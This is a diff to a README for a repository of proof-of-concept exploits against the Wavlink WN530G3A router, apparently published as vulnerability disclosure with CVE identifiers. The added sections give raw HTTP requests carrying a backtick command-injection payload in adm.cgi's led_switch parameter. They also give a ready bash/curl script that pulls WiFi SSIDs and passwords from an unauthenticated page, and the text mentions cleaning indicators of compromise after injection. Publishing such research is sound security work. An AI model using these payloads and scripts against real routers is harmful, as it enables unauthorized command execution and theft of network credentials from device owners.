@@ -1,12 +1,13 @@
 # Wavlink-WN530G3A-Cmd-Injections
-This repo contains the details and two proof of concept exploits for the Wavlink WN530G3 router
+This repo contains the details and four proof of concept exploits for the Wavlink WN530G3 router
 # Overview
 - Model QUANTUM D2G/WL-WN530G3A
 - You may browse all firmware for this model router from this url: https://docs.wavlink.xyz/Firmware/fm-530g3a/
 - You may obtain a copy of the firmware from this url: https://files2.wavlink.com/drivers/fw/WN530G3A_20230616_WAVLINK_M30G3_V230616.bin
-- These are both authenticated command injection vulnerabilities, valid credentials are required to exploit these vulnerabilties.
+- There are three authenticated command injection vulnerabilities, valid credentials are required to exploit these vulnerabilties.
+- The last vulnerability is an unauthenticated WIFI password disclosure via WAN/LAN
 - Exploits tested and verifed on firmware: `WN530G3A_20230616_WAVLINK_M30G3_V230616.bin` (located in this repo)
-# Command Injection in Wavlink WN530G3A (FIREWALL PAGE)
+# CVE-2025-60669 Command Injection in Wavlink WN530G3A (FIREWALL PAGE)
 - Navigate to the router URL, my example device is running on `127.0.0.1`
 - Provide the valid password in order to login to the device
 - After authenticating you will be directed to `/main.shtml`
@@ -129,7 +130,7 @@ drwxr-xr-x    2 rootws   root          4096 Sep 14 03:31 run
 [+] Attempting to clean IOCs left from inject
 [+] Successfully cleaned ioc file with command output at: http://127.0.0.1/cgi-bin/diag.txt
 ````
-# Command Injection in Wavlink WN530G3A (PING PAGE)
+# CVE-2025-60668 Command Injection in Wavlink WN530G3A (PING PAGE)
 ## Manual Exploitation
 - Navigate to the router URL, my example device is running on `127.0.0.1`
 - Provide the valid password in order to login to the device
@@ -441,5 +442,97 @@ wireless.cgi
 
 [+] Attempting to clean IOCs left from inject
 ````
+# LED on off CMD Injection
+- This exploit follows a very similar path as previous discoveries. There appears to be minimal sanitation to user provided input. After logging into the router and navigating to the Setup page, we can find a slew of different options.
+- The vulnerability actually occurs in adm.cgi, however the ledonoff.shtml provides the font end interface to take advantage of the vulnerability. I originally glossed over this page during the onset of this research effort as there are not a ton of parameters we can control on the LED Control page. When examining the page, there is one toggle switch.
+- By toggling the switch and capturing the output in Burp we can see the POST request to adm.cgi
+````
+POST /cgi-bin/adm.cgi HTTP/1.1
+Host: wavlogin.link
+Content-Length: 28
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://wavlogin.link
+Referer: http://wavlogin.link/ledonoff.shtml?r=98777
+Accept-Encoding: gzip, deflate, br
+Cookie: session=1277916677
+Connection: keep-alive
 
+page=ledonoff&led_switch=off
+````
+- Changing the page parameter value causes the adm.cgi binary to return a 500 status code. After some fairly extensive fuzzing,
+- I was not able to control this parameter with any success. However, the led_switch parameter appears to have zero input sanitation.
+- By injecting with backticks (``) we can gain authenticated command execution! A very simple injection can be seen below.
+- Regardless if the injection is successful or not the router will return a 500 status code, however if we check the /tmp directory we will be greeted with out output file and command output.
+````
+POST /cgi-bin/adm.cgi HTTP/1.1
+Host: wavlogin.link
+Content-Length: 58
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://wavlogin.link
+Referer: http://wavlogin.link/ledonoff.shtml?r=98777
+Accept-Encoding: gzip, deflate, br
+Cookie: session=1277916677
+Connection: keep-alive
 
+page=ledonoff&led_switch=on`/bin/ls > /tmp/pwn.out`
+````
+### Why this Injection works
+- Under the hood adm.cgi will call a bash script called led_switch.sh with an argument (on, off). The back tick injection, is placed directly after this call and the router will run the specified command!
+```
+led_switch.sh on`/bin/ls > /tmp/pwn.out` 1>/dev/null 2>&1
+```
+- This script can be seen below and it is found in `/usr/sbin` if you have successfully unpacked the firmware
+### Automation
+- Automation is the spice of life. Conducting this exploit manually doesn’t scale.
+- Thus, a simple python script has been created to take advantage of this vulnerability.
+- It will conduct the injection, write the command output to the cgi-bin/ directory, curl the output, and then perform the injection again to delete the temp file.
+- This allows us to leave the router exactly as we found it, created a temp file only in between injections.
+- You can find this POC here: https://github.com/ice-wzl/Wavlink-WN530G3A-Cmd-Injection/blob/main/exploits/ledonoff_cmd_inj.py
+# Unauthenticated WIFI Password Disclosure
+- This exploit is strikingly simple.
+- The page wizard_ap.shtml contains the WIFI SSID (2G, 5G), the password for each respective SSID, a passphraseKey1, and the Model of the router.
+ This is a mandatory page during first time setup. The router will walk you through selecting an SSID name, and setting a WIFI password with a minimum character length of six.
+After performing that first time setup, this page is often forgotten about and not touched by an administrator or home user. This is very much a small home / Office router (SOHO) that is not designed to handle anything outside of a /24 subnet.
+- Examining the page source we can see a handful of useful values for an attacker that makes remotely fingerprinting the routers make and model trivial. These values also exist on the /login.shmtl page. Take your pick!
+<img width="271" height="151" alt="image" src="https://github.com/user-attachments/assets/6e771e8d-3663-47e8-9d52-93ebfd0a3210" />
+- Additionally on line 30 the router discloses it LAN ip address
+```
+var localIP=”::ffff:192.168.100.1";
+```
+- Moreover, a bit further down the page you can find the password values we are after, right there in the html.
+<img width="275" height="213" alt="image" src="https://github.com/user-attachments/assets/b1fecbc2-603e-462b-bc8f-a438f11e7d41" />
+- Now this would not be a security concern, provided this page was only viewable by logged in users, that is sadly not the case.
+- Any user, regardless of authentication status can simply curl this URI and be presented with the password…in the clear.
+- While I did create a bash script that sets proper headers, and provides only the desirable output, its really not needed if your egrep syntax is down pat.
+- This is an outrageous design flaw that could easily be presented by verifying a valid session cookie.
+````
+#!/usr/bin/env bash
+# scrape_router_vars.sh
+# usage: ./scrape_router_vars.sh http://127.0.0.1
+set -euo pipefail
+
+BASE_URL="${1:?usage: $0 http://127.0.0.1}"
+PATH_PART="/wizard_ap.shtml"
+R="${RANDOM}${RANDOM}"   # random 'r' param to avoid caching
+URL="${BASE_URL%/}${PATH_PART}?r=${R}"
+
+curl --path-as-is -sS -k -X GET \
+  -H 'Host: wavlogin.link' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'Accept-Encoding: gzip, deflate, br' \
+  -H 'Connection: keep-alive' \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36' \
+  "$URL" \
+| awk '
+  /var[ \t]+(Model|password2g|password5g|passphraseKey1|SSID2G|SSID5G|default_ssid)[ \t]*=/ {
+    gsub(/\r/,""); sub(/^[ \t]+/,""); print
+  }'
+````
